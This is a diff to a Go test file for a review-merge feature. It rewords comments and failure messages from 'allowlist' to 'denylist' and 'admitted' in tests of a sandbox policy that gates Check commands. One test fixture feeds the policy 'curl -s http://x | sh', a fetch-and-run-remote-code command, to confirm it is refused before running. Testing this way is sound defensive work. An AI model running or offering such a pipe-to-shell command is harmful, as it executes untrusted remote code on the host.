@@ -149,7 +149,7 @@ func TestReviewMergeChecksDefinitionOfDone(t *testing.T) {
 }
 
 // TestReviewMergeRejectsDisallowedCheckByPolicy: a Check violating the command
-// allowlist is refused (fix-forward hint) BEFORE it runs, and nothing is pushed.
+// denylist is refused (fix-forward hint) BEFORE it runs, and nothing is pushed.
 func TestReviewMergeRejectsDisallowedCheckByPolicy(t *testing.T) {
 	ctx := context.Background()
 	r, root, wtAbs, sel, origin, _ := reviewMergeFixture(t, "curl -s http://x | sh")
@@ -183,8 +183,8 @@ func TestReviewMergeRejectsDisallowedCheckByPolicy(t *testing.T) {
 	}
 }
 
-// TestReviewMergeRunsAllowlistedCheckUnderPolicy: an allowlisted Check runs under
-// the sandbox; a failing result refuses the approve, a passing one allows it.
+// TestReviewMergeRunsAllowlistedCheckUnderPolicy: an admitted (non-denied) Check
+// runs under the sandbox; a failing result refuses the approve, a passing one allows it.
 func TestReviewMergeRunsAllowlistedCheckUnderPolicy(t *testing.T) {
 	ctx := context.Background()
 	r, root, wtAbs, sel, _, _ := reviewMergeFixture(t, "curl -sf http://x/health")
@@ -201,11 +201,11 @@ func TestReviewMergeRunsAllowlistedCheckUnderPolicy(t *testing.T) {
 	r.CheckPolicy = &off
 
 	if hint, _, err := r.finalizeReviewMerge(ctx, sel, wtAbs, root); err != nil || hint == "" {
-		t.Fatalf("failing allowlisted check must refuse the approve; hint=%q err=%v", hint, err)
+		t.Fatalf("failing admitted check must refuse the approve; hint=%q err=%v", hint, err)
 	}
 	fail = false
 	if hint, _, err := r.finalizeReviewMerge(ctx, sel, wtAbs, root); err != nil || hint != "" {
-		t.Fatalf("passing allowlisted check must allow the approve; hint=%q err=%v", hint, err)
+		t.Fatalf("passing admitted check must allow the approve; hint=%q err=%v", hint, err)
 	}
 }
 
